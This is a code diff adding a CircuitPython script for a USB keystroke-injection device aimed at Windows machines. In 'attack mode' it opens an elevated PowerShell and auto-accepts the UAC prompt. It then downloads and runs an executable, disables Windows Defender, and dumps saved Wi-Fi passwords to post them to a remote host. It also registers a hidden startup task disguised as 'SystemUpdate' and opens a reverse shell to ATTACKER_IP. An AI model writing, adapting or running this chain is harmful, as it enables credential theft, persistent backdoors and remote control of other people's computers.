@@ -1,0 +1,176 @@
+import time
+import usb_hid
+from adafruit_hid.keyboard import Keyboard
+from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
+from adafruit_hid.keycode import Keycode
+from machine import Pin
+
+# Setup Mode Detection (GP0 to GND = Setup Mode)
+setup_mode_pin = Pin(0, Pin.IN, Pin.PULL_UP)
+
+# Initialize Keyboard
+keyboard = Keyboard(usb_hid.devices)
+layout = KeyboardLayoutUS(keyboard)
+
+DELAY = 0.5  # Delay between keystrokes
+
+# Payload 1: Download and Execute a File
+def download_execute_file():
+    try:
+        keyboard.press(Keycode.WINDOWS, Keycode.R)
+        keyboard.release_all()
+        time.sleep(DELAY)
+        layout.write("powershell Start-Process powershell -Verb runAs")
+        time.sleep(DELAY)
+        keyboard.press(Keycode.ENTER)
+        keyboard.release_all()
+        time.sleep(2)
+        keyboard.press(Keycode.ALT, Keycode.Y)  # Accept UAC prompt
+        keyboard.release_all()
+        time.sleep(2)
+
+        payload = """
+        Invoke-WebRequest -Uri 'https://example.com/malicious.exe ' -OutFile 'C:\\Users\\Public\\malicious.exe'
+        Start-Process 'C:\\Users\\Public\\malicious.exe'
+        """
+        layout.write(payload)
+        time.sleep(DELAY)
+        keyboard.press(Keycode.ENTER)
+        keyboard.release_all()
+    except Exception as e:
+        print(f"Error in download_execute_file: {e}")
+
+# Payload 2: Disable Windows Defender
+def disable_windows_defender():
+    try:
+        keyboard.press(Keycode.WINDOWS, Keycode.R)
+        keyboard.release_all()
+        time.sleep(DELAY)
+        layout.write("powershell Start-Process powershell -Verb runAs")
+        time.sleep(DELAY)
+        keyboard.press(Keycode.ENTER)
+        keyboard.release_all()
+        time.sleep(2)
+        keyboard.press(Keycode.ALT, Keycode.Y)
+        keyboard.release_all()
+        time.sleep(2)
+
+        layout.write("Set-MpPreference -DisableRealtimeMonitoring $true")
+        time.sleep(DELAY)
+        keyboard.press(Keycode.ENTER)
+        keyboard.release_all()
+    except Exception as e:
+        print(f"Error in disable_windows_defender: {e}")
+
+# Payload 3: Exfiltrate Wi-Fi Passwords
+def exfiltrate_wifi_passwords():
+    try:
+        keyboard.press(Keycode.WINDOWS, Keycode.R)
+        keyboard.release_all()
+        time.sleep(DELAY)
+        layout.write("powershell Start-Process powershell -Verb runAs")
+        time.sleep(DELAY)
+        keyboard.press(Keycode.ENTER)
+        keyboard.release_all()
+        time.sleep(2)
+        keyboard.press(Keycode.ALT, Keycode.Y)
+        keyboard.release_all()
+        time.sleep(2)
+
+        payload = """
+        $profiles = (netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $_ -replace '.*: ','' }
+        $data = $profiles | ForEach-Object { netsh wlan show profile name=\"$_\" key=clear }
+        $encrypted = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
+        Invoke-WebRequest -Uri 'https://example.com/exfiltrate ' -Method POST -Body @{data=$encrypted}
+        """
+        layout.write(payload)
+        time.sleep(DELAY)
+        keyboard.press(Keycode.ENTER)
+        keyboard.release_all()
+    except Exception as e:
+        print(f"Error in exfiltrate_wifi_passwords: {e}")
+
+# Payload 4: Create a Persistent Backdoor
+def create_persistent_backdoor():
+    try:
+        keyboard.press(Keycode.WINDOWS, Keycode.R)
+        keyboard.release_all()
+        time.sleep(DELAY)
+        layout.write("powershell Start-Process powershell -Verb runAs")
+        time.sleep(DELAY)
+        keyboard.press(Keycode.ENTER)
+        keyboard.release_all()
+        time.sleep(2)
+        keyboard.press(Keycode.ALT, Keycode.Y)
+        keyboard.release_all()
+        time.sleep(2)
+
+        payload = """
+        $url = 'https://example.com/malicious.ps1 '
+        $output = '$env:APPDATA\\malicious.ps1'
+        Invoke-WebRequest -Uri $url -OutFile $output
+        $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -File $output"
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'SystemUpdate' -Description 'System Update Task'
+        """
+        layout.write(payload)
+        time.sleep(DELAY)
+        keyboard.press(Keycode.ENTER)
+        keyboard.release_all()
+    except Exception as e:
+        print(f"Error in create_persistent_backdoor: {e}")
+
+# Payload 5: Establish a Reverse Shell
+def establish_reverse_shell():
+    try:
+        keyboard.press(Keycode.WINDOWS, Keycode.R)
+        keyboard.release_all()
+        time.sleep(DELAY)
+        layout.write("powershell Start-Process powershell -Verb runAs")
+        time.sleep(DELAY)
+        keyboard.press(Keycode.ENTER)
+        keyboard.release_all()
+        time.sleep(2)
+        keyboard.press(Keycode.ALT, Keycode.Y)
+        keyboard.release_all()
+        time.sleep(2)
+
+        payload = """
+        $client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP', ATTACKER_PORT)
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535 | %%{0}
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+            $sendback = (iex $data 2>&1 | Out-String)
+            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte, 0, $sendbyte.Length)
+            $stream.Flush()
+        }
+        $client.Close()
+        """
+        layout.write(payload)
+        time.sleep(DELAY)
+        keyboard.press(Keycode.ENTER)
+        keyboard.release_all()
+    except Exception as e:
+        print(f"Error in establish_reverse_shell: {e}")
+
+# Main Function
+def main():
+    if setup_mode_pin.value() == 0:
+        print("Setup Mode: Payload injection is disabled.")
+    else:
+        print("Attack Mode: Executing payloads...")
+        download_execute_file()
+        time.sleep(10)
+        disable_windows_defender()
+        time.sleep(10)
+        exfiltrate_wifi_passwords()
+        time.sleep(10)
+        create_persistent_backdoor()
+        time.sleep(10)
+        establish_reverse_shell()
+
+# Run
+main()
